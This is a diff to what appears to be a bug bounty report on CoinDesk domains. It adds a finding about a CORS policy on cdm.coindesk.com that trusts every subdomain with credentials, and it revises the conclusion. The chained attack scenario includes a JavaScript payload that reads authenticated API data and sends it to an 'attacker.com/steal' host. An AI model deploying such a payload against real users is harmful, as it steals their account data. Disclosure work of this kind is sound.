@@ -179,6 +179,92 @@ Consider IP-restricting the `/studio` path to CoinDesk's office IP ranges.
 
 ---
 
+## F-005: CORS Misconfiguration — `cdm.coindesk.com` Trusts All `*.coindesk.com` Subdomains with Credentials
+
+**Severity:** MEDIUM — P3 (HIGH when chained with F-001)  
+**Target:** `cdm.coindesk.com`, `cdm.uat.coindesk.com`  
+**Category:** CORS Misconfiguration / Security Control Bypass  
+**CVSS:** 6.5 (Medium standalone) — 8.1 when chained with F-001
+
+### Description
+
+`cdm.coindesk.com` implements a CORS policy that reflects any `*.coindesk.com` subdomain as a trusted origin with `Access-Control-Allow-Credentials: true`. This means any subdomain of `coindesk.com` — including subdomains controlled by an attacker via subdomain takeover — can make credentialed cross-origin requests to `cdm.coindesk.com`.
+
+When chained with **F-001** (`go.coindesk.com` Bitly subdomain takeover), this creates a complete CORS credential theft attack chain: an attacker who claims `go.coindesk.com` can serve JavaScript that makes authenticated requests to `cdm.coindesk.com` on behalf of any logged-in CoinDesk user.
+
+### Evidence
+
+**Test 1 — Evil external origin (BLOCKED):**
+```http
+GET / HTTP/2
+Host: cdm.coindesk.com
+Origin: https://evil.com
+X-Bug-Bounty: bugcrowd
+
+HTTP/2 500
+# No Access-Control-Allow-Origin header → request blocked by CORS
+```
+
+**Test 2 — Attacker-controlled subdomain (ALLOWED):**
+```http
+GET / HTTP/2
+Host: cdm.coindesk.com
+Origin: https://go.coindesk.com
+X-Bug-Bounty: bugcrowd
+
+HTTP/2 500
+Access-Control-Allow-Origin: https://go.coindesk.com
+Access-Control-Allow-Credentials: true
+Vary: Origin
+```
+
+**Full CORS origin test results:**
+| Origin | CORS Allowed |
+|--------|-------------|
+| `https://go.coindesk.com` | **YES** — attacker-claimable via F-001 |
+| `https://evil.coindesk.com` | YES — any subdomain accepted |
+| `https://www.coindesk.com` | YES |
+| `https://trade.coindesk.com` | YES |
+| `https://coindesk.com.evil.com` | NO — external domain rejected |
+| `https://evilcoindesk.com` | NO |
+
+Same CORS policy confirmed on `cdm.uat.coindesk.com`.
+
+### Chained Attack Scenario (F-001 + F-005)
+
+1. Attacker claims `go.coindesk.com` via Bitly (see F-001)
+2. Attacker serves malicious JavaScript at `go.coindesk.com/payload.js`:
+   ```javascript
+   fetch('https://cdm.coindesk.com/api/user', {
+     credentials: 'include',
+     headers: { 'Origin': 'https://go.coindesk.com' }
+   }).then(r => r.json()).then(data => {
+     fetch('https://attacker.com/steal?d=' + JSON.stringify(data));
+   });
+   ```
+3. Any CoinDesk user who visits `go.coindesk.com` executes attacker JS
+4. Browser makes credentialed CORS request to `cdm.coindesk.com`
+5. Browser includes authentication cookies — response returned to attacker
+
+### Current Exploitability
+
+`cdm.coindesk.com` currently returns `{"error":"Error: NOT_FOUND"}` with HTTP 500 for all tested paths, indicating the backend is misconfigured or temporarily unavailable. This limits immediate data exfiltration but does not eliminate the risk — the CORS policy is live and any future backend restoration would immediately be exploitable.
+
+### Impact
+
+- **Data Exfiltration**: Authenticated API responses readable by attacker-controlled origin
+- **Cross-Site Request Forgery**: Credentialed state-changing requests possible without CSRF token
+- **Amplifies F-001**: Subdomain takeover becomes a credentialed API access vector, not just phishing
+
+### Remediation
+
+1. Replace wildcard subdomain CORS with an explicit allowlist of trusted origins (e.g., `["https://www.coindesk.com", "https://trade.coindesk.com"]`)
+2. Never combine wildcard subdomain matching with `Access-Control-Allow-Credentials: true`
+3. Fix `cdm.coindesk.com` backend before restoring access
+4. Apply same fix to `cdm.uat.coindesk.com`
+
+---
+
 ## Subdomain CNAME Map (External Services)
 
 | Subdomain | CNAME Target | Service | Status |
@@ -244,8 +330,15 @@ The following were identified but not tested (out-of-scope per program rules):
 
 ## Conclusion
 
-The confirmed finding is **F-001** (`go.coindesk.com` Bitly subdomain takeover, HIGH/P2) which qualifies for Bugcrowd's subdomain takeover category. The Sailthru CNAMEs in **F-002** require manual verification from a non-proxied network before submission.
+The highest-impact confirmed finding is **F-001** (`go.coindesk.com` Bitly subdomain takeover, HIGH/P2) which qualifies for Bugcrowd's subdomain takeover category. When chained with **F-005** (CORS misconfiguration on `cdm.coindesk.com`), the combined impact escalates to HIGH — an attacker controlling `go.coindesk.com` gains a CORS-trusted origin capable of reading credentialed responses from `cdm.coindesk.com`.
 
-**Recommended immediate action:** Remove or reclaim `go.coindesk.com` DNS record before an attacker claims it in Bitly.
+The Sailthru CNAMEs in **F-002** require manual verification from a non-proxied network before submission.
+
+**Priority submissions:**
+1. F-001 + F-005 (chained) — go.coindesk.com takeover as CORS-trusted attack origin
+2. F-001 standalone — subdomain takeover for phishing/malware distribution
+3. F-002 — Sailthru CNAME verification (manual check needed)
+
+**Recommended immediate action:** Remove or reclaim `go.coindesk.com` DNS record AND fix CORS policy on `cdm.coindesk.com` to use an explicit origin allowlist.
 
 **Status:** Active — testing ongoing.
